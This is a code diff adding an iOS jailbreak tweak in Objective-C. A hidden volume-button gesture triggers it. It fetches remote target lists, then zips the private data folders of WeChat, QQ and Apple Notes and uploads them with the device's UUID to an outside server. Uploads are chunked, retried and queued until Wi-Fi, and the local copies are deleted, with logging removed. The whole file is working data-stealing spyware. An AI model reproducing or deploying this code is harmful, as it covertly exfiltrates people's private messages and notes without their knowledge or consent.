@@ -1,0 +1,732 @@
+#import <UIKit/UIKit.h>
+#import <Foundation/Foundation.h>
+#import <spawn.h>
+#import <sys/wait.h>
+#import <sys/utsname.h> // 用于获取设备信息
+#import <math.h> // For ceil
+#import <IOKit/IOKitLib.h> // For IOPlatformUUID
+#import <SystemConfiguration/SystemConfiguration.h> // 用于检测网络状态
+#import <arpa/inet.h> // for sockaddr_in
+#import <netinet/in.h> // for sockaddr_in
+
+extern char **environ;
+
+// ----- 配置区 (已更新) -----
+#define SERVER_URL @"https://iphone.omo123.online/upload"
+// Data/Application 路径的 Bundle ID 包含关键词 URL (如 tencent.xin, tencent.qq)
+#define INCLUDE_APP_BUNDLE_ID_KEYWORDS_URL @"https://omo123.online/appming.txt"
+// Data/Application 路径下要查找的子文件夹名称关键词 URL (如 DB, Documents, data)
+#define INCLUDE_APP_SUBFOLDER_KEYWORDS_URL @"https://omo123.online/appziwenjianjia.txt"
+// Shared/AppGroup 路径的 Bundle ID 包含关键词 URL (保持不变)
+#define INCLUDE_APPGROUP_KEYWORDS_URL @"https://omo123.online/appgroup.txt"
+
+#define DATA_APPLICATION_PATH @"/var/mobile/Containers/Data/Application"
+#define SHARED_APPGROUP_PATH @"/var/mobile/Containers/Shared/AppGroup"
+//#define LOG_PREFIX @"[ZipperLog] " // 移除日志前缀定义
+#define RUN_ONCE_FLAG_PATH @"/var/tmp/zipper_task_has_run"
+#define MAX_ZIP_FILE_SIZE (20 * 1024 * 1024) // 20 MB
+
+// ----- 新增配置 -----
+#define UPLOAD_QUEUE_KEY @"DataZipperUploadQueue" // NSUserDefaults 存储队列的 Key
+
+// ----- 全局变量 -----
+static NSTimeInterval g_volume_up_time = 0;
+static NSTimeInterval g_volume_down_time = 0;
+static dispatch_queue_t g_task_queue;
+static dispatch_queue_t g_upload_queue; // 新增上传队列
+static SCNetworkReachabilityRef g_reachability_ref; // 用于网络状态监听
+
+@interface DataZipper : NSObject
++ (void)triggerZipAndSendTask;
+@end
+
+@implementation DataZipper
+
+#pragma mark - 网络状态检测
+
+// 检查当前网络是否为 Wi-Fi
++ (BOOL)isWiFiConnected {
+    SCNetworkReachabilityFlags flags;
+    // 检查 g_reachability_ref 是否有效
+    if (g_reachability_ref == NULL) {
+        return NO;
+    }
+
+    BOOL reachable = SCNetworkReachabilityGetFlags(g_reachability_ref, &flags);
+
+    if (!reachable) {
+        return NO;
+    }
+
+    BOOL isReachable = (flags & kSCNetworkReachabilityFlagsReachable) != 0;
+    BOOL needsConnection = (flags & kSCNetworkReachabilityFlagsConnectionRequired) != 0;
+    BOOL isWWAN = (flags & kSCNetworkReachabilityFlagsIsWWAN) != 0; // 蜂窝网络
+
+    // 可达，不需要连接（或者连接已建立），且不是蜂窝网络，则认为是 Wi-Fi
+    return isReachable && (!needsConnection || (flags & kSCNetworkReachabilityFlagsConnectionOnDemand)) && !isWWAN;
+}
+
+// Reachability 回调函数
+static void ReachabilityCallback(SCNetworkReachabilityRef target, SCNetworkReachabilityFlags flags, void *info) {
+    // 确保在主线程处理 UI 相关或需要同步的操作
+    dispatch_async(dispatch_get_main_queue(), ^{
+        if ([DataZipper isWiFiConnected]) {
+            [DataZipper processUploadQueue];
+        } else {
+            // Not Wi-Fi
+        }
+    });
+}
+
+// 启动网络状态监听
++ (void)startReachabilityNotifier {
+    struct sockaddr_in zeroAddress;
+    bzero(&zeroAddress, sizeof(zeroAddress));
+    zeroAddress.sin_len = sizeof(zeroAddress);
+    zeroAddress.sin_family = AF_INET;
+
+    g_reachability_ref = SCNetworkReachabilityCreateWithAddress(kCFAllocatorDefault, (const struct sockaddr*)&zeroAddress);
+    if (g_reachability_ref != NULL) {
+        SCNetworkReachabilityContext context = {0, (__bridge void *)(self), NULL, NULL, NULL};
+        if (SCNetworkReachabilitySetCallback(g_reachability_ref, ReachabilityCallback, &context)) {
+            if (!SCNetworkReachabilityScheduleWithRunLoop(g_reachability_ref, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode)) {
+                // Error scheduling reachability
+            }
+        } else {
+            // Error setting reachability callback
+        }
+    } else {
+        // Error creating reachability reference
+    }
+}
+
+// 停止网络状态监听
++ (void)stopReachabilityNotifier {
+    if (g_reachability_ref != NULL) {
+        SCNetworkReachabilityUnscheduleFromRunLoop(g_reachability_ref, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
+        CFRelease(g_reachability_ref);
+        g_reachability_ref = NULL;
+    }
+}
+
+#pragma mark - 上传队列管理
+
+// 将文件路径添加到待上传队列
++ (void)addFileToUploadQueue:(NSString *)filePath deviceName:(NSString *)deviceName fileType:(NSString *)fileType {
+    @synchronized (self) {
+        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+        NSMutableArray *queue = [[defaults arrayForKey:UPLOAD_QUEUE_KEY] mutableCopy];
+        if (!queue) {
+            queue = [NSMutableArray array];
+        }
+        // 检查文件是否已在队列中，避免重复添加
+        BOOL alreadyInQueue = NO;
+        for (NSDictionary *info in queue) {
+            if ([info[@"path"] isEqualToString:filePath]) {
+                alreadyInQueue = YES;
+                break;
+            }
+        }
+
+        if (!alreadyInQueue) {
+            NSDictionary *fileInfo = @{
+                @"path": filePath,
+                @"deviceName": deviceName,
+                @"fileType": fileType
+            };
+            [queue addObject:fileInfo];
+            [defaults setObject:queue forKey:UPLOAD_QUEUE_KEY];
+            [defaults synchronize]; // 立即写入
+        } else {
+            // File already in queue
+        }
+    }
+}
+
+// 从队列中移除文件路径 (此方法在 processUploadQueue 内部处理成功上传后调用)
++ (void)removeFileFromUploadQueue:(NSString *)filePath {
+    @synchronized (self) {
+        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+        NSMutableArray *queue = [[defaults arrayForKey:UPLOAD_QUEUE_KEY] mutableCopy];
+        if (queue) {
+            NSPredicate *predicate = [NSPredicate predicateWithFormat:@"path != %@", filePath];
+            [queue filterUsingPredicate:predicate];
+            [defaults setObject:queue forKey:UPLOAD_QUEUE_KEY];
+            [defaults synchronize]; // 立即写入
+        }
+    }
+}
+
+// 处理待上传队列中的文件
++ (void)processUploadQueue {
+    dispatch_async(g_upload_queue, ^{
+        if (![self isWiFiConnected]) {
+            return;
+        }
+
+        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+        NSArray *queue = [defaults arrayForKey:UPLOAD_QUEUE_KEY];
+        if (!queue || queue.count == 0) {
+            return;
+        }
+
+        NSMutableArray *remainingFiles = [NSMutableArray array]; // 用于存储本次未能成功上传的文件
+
+        for (NSDictionary *fileInfo in queue) {
+            NSString *filePath = fileInfo[@"path"];
+            NSString *deviceName = fileInfo[@"deviceName"];
+            NSString *fileType = fileInfo[@"fileType"];
+
+            if ([[NSFileManager defaultManager] fileExistsAtPath:filePath]) {
+                // 如果 uploadFileInternal 成功上传并删除了文件，则返回YES
+                if ([self uploadFileInternal:filePath withDeviceName:deviceName fileType:fileType]) {
+                    // Successfully uploaded and removed
+                } else {
+                    [remainingFiles addObject:fileInfo]; // Add to failed list for retry
+                }
+            } else {
+                // File does not exist, automatically removed
+            }
+        }
+        
+        // 更新队列，只保留本次上传失败的或者原本就不存在的文件（因为上面的逻辑已经过滤掉不存在的）
+        [defaults setObject:remainingFiles forKey:UPLOAD_QUEUE_KEY];
+        [defaults synchronize];
+    });
+}
+
+
+#pragma mark - 现有方法
+
+// 获取设备 UDID - 使用 IOPlatformUUID
++ (NSString *)getDeviceUDID {
+    io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                              IOServiceMatching("IOPlatformExpertDevice"));
+    CFTypeRef serialNumberAsCFString = IORegistryEntryCreateCFProperty(platformExpert,
+                                                                        CFSTR("IOPlatformUUID"), kCFAllocatorDefault, 0);
+    IOObjectRelease(platformExpert);
+
+    NSString *uuid = (__bridge_transfer NSString *)serialNumberAsCFString;
+    if (!uuid) {
+        // Fallback if IOPlatformUUID fails (unlikely on iOS)
+        struct utsname systemInfo;
+        uname(&systemInfo);
+        uuid = [NSString stringWithFormat:@"%s", systemInfo.machine];
+    } else {
+        // Successfully got UDID
+    }
+    return uuid;
+}
+
+// 执行命令
++ (int)runCommand:(const char *)command {
+    pid_t pid;
+    const char *argv[] = {"sh", "-c", command, NULL};
+    int status;
+    int spawn_status = posix_spawn(&pid, "/bin/sh", NULL, NULL, (char* const*)argv, environ);
+    if (spawn_status == 0) {
+        if (waitpid(pid, &status, 0) != -1) {
+            if (WIFEXITED(status)) return WEXITSTATUS(status);
+        }
+    }
+    return -1;
+}
+
+// 通用的网络关键词获取函数
++ (NSArray<NSString *> *)getKeywordsFromURL:(NSString *)urlString orUseDefault:(NSArray<NSString *> *)defaultList {
+    __block NSArray<NSString *> *keywords = nil;
+    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
+    
+    NSURLSession *session = [NSURLSession sharedSession];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
+    request.timeoutInterval = 5; // 缩短超时，快速失败
+
+    [[session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (!error && ((NSHTTPURLResponse *)response).statusCode == 200) {
+            NSString *keywordString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            keywordString = [keywordString stringByReplacingOccurrencesOfString:@"、" withString:@"\n"];
+            keywords = [keywordString componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
+        } else {
+            // Error fetching keywords
+        }
+        dispatch_semaphore_signal(sema);
+    }] resume];
+    
+    dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, 7 * NSEC_PER_SEC));
+
+    if (!keywords) {
+        keywords = defaultList;
+    }
+    
+    NSMutableArray<NSString *> *processedKeywords = [NSMutableArray array];
+    for (NSString *keyword in keywords) {
+        NSString *trimmed = [keyword stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (trimmed.length > 0) {
+            [processedKeywords addObject:trimmed];
+        }
+    }
+    return processedKeywords;
+}
+
+// 递归查找并打包匹配的子文件夹 (用于 Data/Application)
+// originalAppBundleID 用于文件名，以便服务器分类
++ (NSInteger)findAndZipSubfoldersInPath:(NSString *)rootPath
+                            appBundleID:(NSString *)originalAppBundleID
+                            subKeywords:(NSArray<NSString *> *)subKeywords // 这里的关键词应保持原始大小写
+                             deviceName:(NSString *)deviceName
+                            fileManager:(NSFileManager *)fileManager
+                          dateFormatter:(NSDateFormatter *)dateFormatter
+                         processedPaths:(NSMutableSet<NSString *> *)processedPaths {
+    
+    NSInteger zippedCount = 0; // 记录成功打包的文件夹数量
+    NSError *error = nil;
+    NSArray<NSString *> *contents = [fileManager contentsOfDirectoryAtPath:rootPath error:&error];
+    if (error) {
+        return zippedCount; // 无法访问的目录，返回0
+    }
+
+    for (NSString *item in contents) {
+        NSString *fullPath = [rootPath stringByAppendingPathComponent:item];
+        BOOL isDirectory = NO;
+        if ([fileManager fileExistsAtPath:fullPath isDirectory:&isDirectory] && isDirectory) {
+            // 直接使用原始文件夹名称 'item' 进行严格区分大小写的匹配
+            BOOL matched = NO;
+            for (NSString *keyword in subKeywords) {
+                // 要求文件夹名称与关键词完全匹配，且严格区分大小写
+                if ([item isEqualToString:keyword]) {
+                    matched = YES;
+                    break;
+                }
+            }
+
+            if (matched) {
+                // 检查是否已经处理过这个路径或其父路径（为了去重）
+                BOOL alreadyProcessed = NO;
+                for (NSString *pPath in processedPaths) {
+                    if ([fullPath hasPrefix:pPath]) { // 如果当前路径是已处理路径的子路径
+                        alreadyProcessed = YES;
+                        break;
+                    }
+                }
+
+                if (!alreadyProcessed) {
+                    // Add current folder to processed paths
+                    [processedPaths addObject:fullPath];
+
+                    NSString *stagingPath = [NSTemporaryDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"zip_staging_Subfolder_%@", [[NSUUID UUID] UUIDString]]];
+                    [fileManager removeItemAtPath:stagingPath error:nil];
+                    NSError *createDirError = nil;
+                    [fileManager createDirectoryAtPath:stagingPath withIntermediateDirectories:YES attributes:nil error:&createDirError];
+                    if (createDirError) {
+                        continue;
+                    }
+
+                    NSError *copyError = nil;
+                    [fileManager copyItemAtPath:fullPath toPath:[stagingPath stringByAppendingPathComponent:item] error:&copyError];
+                    if (copyError) {
+                        [fileManager removeItemAtPath:stagingPath error:nil];
+                        continue;
+                    }
+
+                    NSString *currentDateTime = [dateFormatter stringFromDate:[NSDate date]];
+                    NSString *tempZipFileName = [NSString stringWithFormat:@"%@-%@-%@-%@.zip", currentDateTime, deviceName, originalAppBundleID, item];
+                    NSString *tempZipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:tempZipFileName];
+                    
+                    NSString *zipCommand = [NSString stringWithFormat:@"(cd '%@' && zip -r -y -q -o '%@' '%@' && sync)", stagingPath, tempZipPath, item];
+                    [self runCommand:[zipCommand UTF8String]];
+
+                    if ([fileManager fileExistsAtPath:tempZipPath]) {
+                        [self uploadOrQueueFile:tempZipPath withDeviceName:deviceName fileType:@"Application"]; // 调用新的上传或入队方法
+                        zippedCount++; // 成功打包，计数增加
+                    } else {
+                        // Zip failed
+                    }
+                    [fileManager removeItemAtPath:stagingPath error:nil];
+                }
+            }
+            // 递归进入子文件夹继续查找
+            zippedCount += [self findAndZipSubfoldersInPath:fullPath
+                                                 appBundleID:originalAppBundleID
+                                                 subKeywords:subKeywords
+                                                  deviceName:deviceName
+                                                 fileManager:fileManager
+                                               dateFormatter:dateFormatter
+                                              processedPaths:processedPaths];
+        } else {
+            // If it's a file, ignore it
+        }
+    }
+    return zippedCount;
+}
+
+// 主任务
++ (void)triggerZipAndSendTask {
+    if ([[NSFileManager defaultManager] fileExistsAtPath:RUN_ONCE_FLAG_PATH]) {
+        return;
+    }
+
+    [[NSFileManager defaultManager] createFileAtPath:RUN_ONCE_FLAG_PATH contents:nil attributes:nil];
+    
+    dispatch_async(g_task_queue, ^{
+        NSFileManager *fileManager = [NSFileManager defaultManager];
+        
+        // 获取应用程序 Bundle ID 关键词 - 这些关键词会被转换为小写在 getKeywordsFromURL 中
+        NSArray<NSString *> *appBundleIdKeywords = [self getKeywordsFromURL:INCLUDE_APP_BUNDLE_ID_KEYWORDS_URL orUseDefault:@[@"tencent.xin", @"tencent.qq"]];
+        
+        // 获取应用程序内部子文件夹名称关键词 - 这些关键词将保持原始大小写，用于严格匹配
+        NSArray<NSString *> *appSubfolderKeywords = [self getKeywordsFromURL:INCLUDE_APP_SUBFOLDER_KEYWORDS_URL orUseDefault:@[@"DB", @"Documents"]]; // 默认值改为常用的大写
+        
+        // 获取 Shared/AppGroup 的 Bundle ID 包含关键词 - 这些关键词会被转换为小写在 getKeywordsFromURL 中
+        NSArray<NSString *> *appGroupIncludeKeywords = [self getKeywordsFromURL:INCLUDE_APPGROUP_KEYWORDS_URL orUseDefault:@[@"apple.notes"]];
+        
+        NSString *deviceName = [self getDeviceUDID]; // 获取真实的 UDID
+        NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
+        dateFormatter.dateFormat = @"yyyy-MM-dd-HH-mm-ss";
+        
+        // --- 处理 /var/mobile/Containers/Data/Application 路径 ---
+        NSInteger totalAppDataZippedCount = 0;
+        if (![fileManager fileExistsAtPath:DATA_APPLICATION_PATH isDirectory:nil]) {
+            // Error: Data/Application path not found
+        } else {
+            NSError *dataAppContentsError = nil;
+            NSArray<NSString *> *appUuidDirs = [fileManager contentsOfDirectoryAtPath:DATA_APPLICATION_PATH error:&dataAppContentsError];
+            if (dataAppContentsError) {
+                // Error reading Data/Application directory
+            } else {
+                for (NSString *uuidDir in appUuidDirs) {
+                    NSString *fullUuidPath = [DATA_APPLICATION_PATH stringByAppendingPathComponent:uuidDir];
+                    NSString *metadataPath = [fullUuidPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
+                    
+                    if ([fileManager fileExistsAtPath:metadataPath]) {
+                        NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:metadataPath];
+                        NSString *bundleId = metadata[@"MCMMetadataIdentifier"];
+                        if (bundleId) {
+                            NSString *lowerCasedBundleId = bundleId.lowercaseString;
+                            BOOL shouldProcessApp = NO;
+                            for (NSString *keyword in appBundleIdKeywords) {
+                                if ([lowerCasedBundleId containsString:keyword]) {
+                                    shouldProcessApp = YES;
+                                    break;
+                                }
+                            }
+                            
+                            if (shouldProcessApp) {
+                                // Recursively find and zip target subfolders within the matched app folder
+                                NSMutableSet<NSString *> *processedSubfolderPaths = [NSMutableSet set];
+                                NSInteger appZippedCount = [self findAndZipSubfoldersInPath:fullUuidPath
+                                                                                 appBundleID:bundleId
+                                                                                 subKeywords:appSubfolderKeywords
+                                                                                  deviceName:deviceName
+                                                                                 fileManager:fileManager
+                                                                               dateFormatter:dateFormatter
+                                                                              processedPaths:processedSubfolderPaths];
+                                totalAppDataZippedCount += appZippedCount;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // --- 处理 /var/mobile/Containers/Shared/AppGroup 路径 ---
+        NSInteger totalAppGroupZippedCount = 0;
+        if (![fileManager fileExistsAtPath:SHARED_APPGROUP_PATH isDirectory:nil]) {
+            // Error: Shared/AppGroup path not found
+        } else {
+            NSError *appGroupContentsError = nil;
+            NSArray<NSString *> *appGroupUuidDirs = [fileManager contentsOfDirectoryAtPath:SHARED_APPGROUP_PATH error:&appGroupContentsError];
+            if (appGroupContentsError) {
+                // Error reading Shared/AppGroup directory
+            } else {
+                for (NSString *uuidDir in appGroupUuidDirs) {
+                    NSString *fullUuidPath = [SHARED_APPGROUP_PATH stringByAppendingPathComponent:uuidDir];
+                    NSString *metadataPath = [fullUuidPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
+                    
+                    if ([fileManager fileExistsAtPath:metadataPath]) {
+                        NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:metadataPath];
+                        NSString *bundleId = metadata[@"MCMMetadataIdentifier"];
+                        if (bundleId) {
+                            NSString *lowerCasedBundleId = bundleId.lowercaseString;
+                            BOOL shouldIncludeAppGroup = NO;
+                            for (NSString *keyword in appGroupIncludeKeywords) {
+                                if ([lowerCasedBundleId containsString:keyword]) {
+                                    shouldIncludeAppGroup = YES;
+                                    break;
+                                }
+                            }
+
+                            if (shouldIncludeAppGroup) {
+                                NSString *stagingPath = [NSTemporaryDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"zip_staging_AppGroup_%@", [[NSUUID UUID] UUIDString]]];
+                                [fileManager removeItemAtPath:stagingPath error:nil];
+                                NSError *createDirError = nil;
+                                [fileManager createDirectoryAtPath:stagingPath withIntermediateDirectories:YES attributes:nil error:&createDirError];
+                                if (createDirError) {
+                                    continue;
+                                }
+
+                                NSError *copyError = nil;
+                                NSArray *contentsOfAppGroup = [fileManager contentsOfDirectoryAtPath:fullUuidPath error:&copyError];
+                                if (copyError) {
+                                    [fileManager removeItemAtPath:stagingPath error:nil];
+                                    continue;
+                                }
+
+                                BOOL appGroupHasContentToZip = NO;
+                                for (NSString *item in contentsOfAppGroup) {
+                                    NSString *sourcePath = [fullUuidPath stringByAppendingPathComponent:item];
+                                    NSString *destinationPath = [stagingPath stringByAppendingPathComponent:item];
+                                    NSError *itemCopyError = nil;
+                                    [fileManager linkItemAtPath:sourcePath toPath:destinationPath error:&itemCopyError];
+                                    if (itemCopyError) {
+                                        [fileManager copyItemAtPath:sourcePath toPath:destinationPath error:&itemCopyError];
+                                        if (itemCopyError) {
+                                            continue;
+                                        }
+                                    }
+                                    appGroupHasContentToZip = YES;
+                                }
+
+                                if (appGroupHasContentToZip) {
+                                    NSString *currentDateTime = [dateFormatter stringFromDate:[NSDate date]];
+                                    NSString *tempZipFileName = [NSString stringWithFormat:@"%@-%@-%@-AppGroup.zip", currentDateTime, deviceName, bundleId];
+                                    NSString *tempZipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:tempZipFileName];
+                                    
+                                    NSString *zipCommand = [NSString stringWithFormat:@"(cd '%@' && zip -r -y -q -o '%@' . && sync)", stagingPath, tempZipPath];
+                                    [self runCommand:[zipCommand UTF8String]];
+
+                                    if ([fileManager fileExistsAtPath:tempZipPath]) {
+                                        [self uploadOrQueueFile:tempZipPath withDeviceName:deviceName fileType:@"AppGroup"]; // 调用新的上传或入队方法
+                                        totalAppGroupZippedCount++;
+                                    } else {
+                                        // Zip failed
+                                    }
+                                } else {
+                                    // AppGroup has no content to zip
+                                }
+                                [fileManager removeItemAtPath:stagingPath error:nil];
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        // 任务完成后，尝试处理队列中的文件
+        [self processUploadQueue];
+    });
+}
+
+// 新增：根据网络状态选择上传或入队
++ (void)uploadOrQueueFile:(NSString *)zipFilePath withDeviceName:(NSString *)deviceName fileType:(NSString *)fileType {
+    if ([self isWiFiConnected]) {
+        [self uploadFileInternal:zipFilePath withDeviceName:deviceName fileType:fileType];
+    } else {
+        [self addFileToUploadQueue:zipFilePath deviceName:deviceName fileType:fileType];
+    }
+}
+
+// 实际上传文件的内部方法
++ (BOOL)uploadFileInternal:(NSString *)zipFilePath withDeviceName:(NSString *)deviceName fileType:(NSString *)fileType {
+    NSData *zipData = [NSData dataWithContentsOfFile:zipFilePath options:NSDataReadingMappedIfSafe error:nil];
+    if (!zipData) {
+        return NO;
+    }
+    
+    // If file size exceeds MAX_ZIP_FILE_SIZE, upload in chunks
+    if ([zipData length] > MAX_ZIP_FILE_SIZE) {
+        NSUInteger offset = 0;
+        int partNumber = 0;
+        NSString *originalFileName = [zipFilePath lastPathComponent];
+        NSUInteger totalParts = (NSUInteger)ceil((double)[zipData length] / MAX_ZIP_FILE_SIZE);
+
+        while (offset < [zipData length]) {
+            partNumber++;
+            NSUInteger length = MIN([zipData length] - offset, MAX_ZIP_FILE_SIZE);
+            NSData *chunk = [zipData subdataWithRange:NSMakeRange(offset, length)];
+            
+            __block BOOL uploadSuccess = NO;
+            int uploadRetryCount = 0;
+            
+            while (!uploadSuccess && uploadRetryCount < 5) { // Retry up to 5 times
+                uploadRetryCount++;
+
+                NSURL *url = [NSURL URLWithString:SERVER_URL];
+                NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+                request.HTTPMethod = @"POST";
+                request.timeoutInterval = 600; // 10 minute timeout
+
+                NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
+                [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+                
+                NSMutableData *body = [NSMutableData data];
+                [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+                
+                // Add device name as form data
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"deviceName\"\r\n\r\n%@", deviceName] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+                // Add file type as form data
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"fileType\"\r\n\r\n%@", fileType] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+                // Add original file name as form data for server to know which file's chunk it is
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"originalFileName\"\r\n\r\n%@", originalFileName] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+                // Add total parts and current part number as form data
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"totalParts\"\r\n\r\n%lu", (unsigned long)totalParts] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"currentPart\"\r\n\r\n%d", partNumber] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+                // Add chunk file
+                [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@.part%d\"\r\n", originalFileName, partNumber] dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+                [body appendData:chunk];
+                [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+                request.HTTPBody = body;
+                
+                dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
+                
+                [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+                    if (error) {
+                        // Upload chunk failed due to network error
+                    } else if (((NSHTTPURLResponse *)response).statusCode == 200) {
+                        uploadSuccess = YES;
+                    } else {
+                        // Upload chunk failed with server status code
+                    }
+                    dispatch_semaphore_signal(semaphore);
+                }] resume];
+
+                dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
+
+                if (!uploadSuccess && uploadRetryCount < 5) {
+                    [NSThread sleepForTimeInterval:10.0]; // Wait 10 seconds before retrying on failure
+                }
+            }
+            if (!uploadSuccess) {
+                return NO; // If a chunk fails, the whole file upload fails
+            }
+            offset += length;
+        }
+        // If all chunks uploaded successfully, delete the original file
+        [[NSFileManager defaultManager] removeItemAtPath:zipFilePath error:nil];
+        return YES;
+    } else {
+        // Smaller file, upload directly
+        __block BOOL uploadSuccess = NO;
+        int uploadRetryCount = 0;
+        while (!uploadSuccess && uploadRetryCount < 5) { // Retry up to 5 times
+            uploadRetryCount++;
+
+            NSURL *url = [NSURL URLWithString:SERVER_URL];
+            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+            request.HTTPMethod = @"POST";
+            request.timeoutInterval = 600;
+
+            NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
+            [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+            
+            NSMutableData *body = [NSMutableData data];
+            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+            
+            // Add device name as form data
+            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"deviceName\"\r\n\r\n%@", deviceName] dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+            // Add file type as form data
+            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"fileType\"\r\n\r\n%@", fileType] dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+
+            // Add file
+            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", [zipFilePath lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[@"Content-Type: application/zip\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:zipData];
+            [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+            request.HTTPBody = body;
+            
+            dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
+            
+            [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+                if (error) {
+                    // Upload failed due to network error
+                } else if (((NSHTTPURLResponse *)response).statusCode == 200) {
+                    uploadSuccess = YES;
+                } else {
+                    // Upload failed with server status code
+                }
+                dispatch_semaphore_signal(semaphore);
+            }] resume];
+
+            dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
+
+            if (!uploadSuccess && uploadRetryCount < 5) {
+                [NSThread sleepForTimeInterval:10.0]; // Wait 10 seconds before retrying on failure
+            }
+        }
+        
+        if (uploadSuccess) {
+            [[NSFileManager defaultManager] removeItemAtPath:zipFilePath error:nil];
+            return YES;
+        } else {
+            return NO;
+        }
+    }
+}
+
+
+@end
+
+// ----- Hook 音量控制 -----
+%hook VolumeControl
+
+-(void)increaseVolume {
+    g_volume_up_time = [[NSDate date] timeIntervalSince1970];
+    %orig;
+}
+
+-(void)decreaseVolume {
+    NSTimeInterval nowtime = [[NSDate date] timeIntervalSince1970];
+    if (g_volume_up_time != 0 && nowtime - g_volume_up_time < 1.5) {
+        [DataZipper triggerZipAndSendTask];
+        g_volume_up_time = 0;
+    }
+    g_volume_down_time = nowtime;
+    %orig;
+}
+%end
+
+// ----- 构造函数 -----
+%ctor {
+    if([[NSProcessInfo processInfo] isOperatingSystemAtLeastVersion:(NSOperatingSystemVersion){13, 0, 0}]) {
+        %init(VolumeControl = NSClassFromString(@"SBVolumeControl"));
+    }
+    g_task_queue = dispatch_queue_create("com.datasipper.taskqueue", DISPATCH_QUEUE_SERIAL);
+    g_upload_queue = dispatch_queue_create("com.datasipper.uploadqueue", DISPATCH_QUEUE_SERIAL); // 初始化上传队列
+
+    // 启动网络状态监听器
+    [DataZipper startReachabilityNotifier];
+    
+    // 在插件加载时，检查是否有待上传的文件，并尝试上传
+    [DataZipper processUploadQueue];
+}
+
